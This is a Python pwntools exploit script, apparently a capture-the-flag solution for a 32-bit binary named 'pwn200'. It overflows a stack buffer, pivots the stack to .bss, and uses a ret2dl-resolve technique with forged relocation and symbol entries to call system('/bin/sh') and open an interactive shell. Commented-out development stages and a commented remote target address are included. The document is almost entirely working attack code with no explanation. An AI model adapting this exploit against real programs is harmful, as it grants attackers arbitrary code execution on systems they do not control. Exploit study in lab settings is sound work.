#!/bin/python3
from pwn import *

elf = ELF('./pwn200')
offset = 0x6c+4
read_plt = elf.plt['read']
write_plt = elf.plt['write']

# 0x0804856c : pop esi ; pop edi ; pop ebp ; ret
ppp_ret = 0x0804856c
pop_ebp_ret = 0x08048453
leave_ret = 0x08048481

stack_size = 0x800
bss_addr = 0x804a020
base_stage = bss_addr + stack_size

p = process('./pwn200')
# p = remote('121.4.113.135', 28014)
p.recvuntil('\n')
pause()
payload  = b'a'*offset
payload += p32(read_plt)
payload += p32(ppp_ret)
# read(0, base_stage, 100)
payload += p32(0)
payload += p32(base_stage)
payload += p32(100)

payload += p32(pop_ebp_ret)
payload += p32(base_stage)
payload += p32(leave_ret)

p.sendline(payload)


'''
# stage1
cmd = b"/bin/sh"
payload2  = b'AAAA'
payload2 += p32(write_plt)
payload2 += b'AAAA'
payload2 += p32(1)
payload2 += p32(base_stage + 80)
payload2 += p32(len(cmd))
payload2 += b'A' * (80 - len(payload2))
payload2 += cmd + b'\x00'
payload2 += b'A' * (100 - len(payload2))

# stage2
cmd = b"/bin/sh"
plt_0 = 0x8048370
index_offset = 0x20

payload2  = b'AAAA'
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += b'AAAA'
payload2 += p32(1)
payload2 += p32(base_stage + 80)
payload2 += p32(len(cmd))
payload2 += b'A' * (80 - len(payload2))
payload2 += cmd + b'\x00'
payload2 += b'A' * (100 - len(payload2))


# stage3
cmd = b"/bin/sh"
plt_0 = 0x8048370
rel_plt = 0x8048318
index_offset = (base_stage + 0x1C) - rel_plt
write_got = elf.got['write']
r_info = 0x507
fake_reloc = p32(write_got) + p32(r_info)

payload2  = b'AAAA'
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += b'AAAA'
payload2 += p32(1)
payload2 += p32(base_stage + 80)
payload2 += p32(len(cmd))
payload2 += fake_reloc
payload2 += b'A' * (80 - len(payload2))
payload2 += cmd + b'\x00'
payload2 += b'A' * (100 - len(payload2))

# stage4
cmd = b"/bin/sh"
plt_0 = 0x8048370
rel_plt = 0x8048318
index_offset = (base_stage + 0x1C) - rel_plt
write_got = elf.got['write']

dynsym = 0x80481d8
dynstr = 0x8048268
fake_sym_addr = base_stage + 0x24
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
success("align --> %s " % align)
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10
success("index_dynsym --> %s " % index_dynsym)
r_info = (int(index_dynsym) << 8) | 0x7
fake_reloc = p32(write_got) + p32(r_info)
st_name = 0x54
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)

payload2  = b'AAAA'
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += b'AAAA'
payload2 += p32(1)
payload2 += p32(base_stage + 80)
payload2 += p32(len(cmd))
payload2 += fake_reloc
payload2 += b'B' * align
payload2 += fake_sym
payload2 += b'A' * (80 - len(payload2))
payload2 += cmd + b'\x00'
payload2 += b'A' * (100 - len(payload2))

'''


# stage5
cmd = b"/bin/sh"
plt_0 = 0x8048370
rel_plt = 0x8048318
index_offset = (base_stage + 0x1c) - rel_plt
write_got = elf.got['write']

dynsym = 0x80481d8
dynstr = 0x8048268
fake_sym_addr = base_stage + 0x24
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10
r_info = (int(index_dynsym) << 8) | 0x7
fake_reloc = p32(write_got) + p32(r_info)
st_name = (fake_sym_addr + 0x10) - dynstr
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)

payload2  = b'AAAA'
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += b'AAAA'
payload2 += p32(base_stage + 80)
payload2 += b'AAAA'
payload2 += b'AAAA'
payload2 += fake_reloc
payload2 += b'B' * align
payload2 += fake_sym
payload2 += b"system\x00"
payload2 += b'A' * (80 - len(payload2))
payload2 += cmd + b'\x00'
payload2 += b'A' * (100 - len(payload2))

pause()
p.sendline(payload2)
p.interactive()